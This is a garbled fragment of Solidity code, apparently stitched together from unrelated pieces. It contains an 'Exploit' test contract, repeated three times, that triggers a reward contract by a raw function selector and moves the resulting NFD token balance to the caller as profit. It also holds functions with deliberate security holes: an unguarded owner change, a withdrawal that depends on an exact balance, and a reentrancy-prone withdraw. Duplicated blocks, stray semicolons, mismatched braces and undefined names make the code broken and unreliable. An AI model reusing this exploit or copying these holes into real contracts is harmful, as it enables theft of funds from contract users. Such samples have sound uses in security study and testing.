
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
contract Exploit is Test {
    address constant rewardContract = vulnContract;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
    function abuse() external {
        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
        uint256 bal = IERC20(nfd).balanceOf(address(this));
        require(IERC20(nfd).transfer(msg.sender, bal), "Transfer profit failed")};

;
;
contract Exploit is Test {
    address constant rewardContract = vulnContract;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
    function abuse() external {
        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
        uint256 bal = IERC20(nfd).balanceOf(address(this));
        require(IERC20(nfd).transfer(msg.sender, bal), "Transfer profit failed")};

;
;
contract Exploit is Test {
    address constant rewardContract = vulnContract;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
    function abuse() external {
        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
        uint256 bal = IERC20(nfd).balanceOf(address(this));
        require(IERC20(nfd).transfer(msg.sender, bal), "Transfer profit failed")};
function changeOwner(address newOwner) public {
    owner = newOwner}
function withdrawExact() public {
    require(address(this).balance == 1 ether);
    payable(msg.sender).transfer(1 ether)}
mapping(address => uint256) public balances;
function withdraw() public {
    if (balances[msg.sender] > 0) {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent);
        balances[msg.sender] = 0}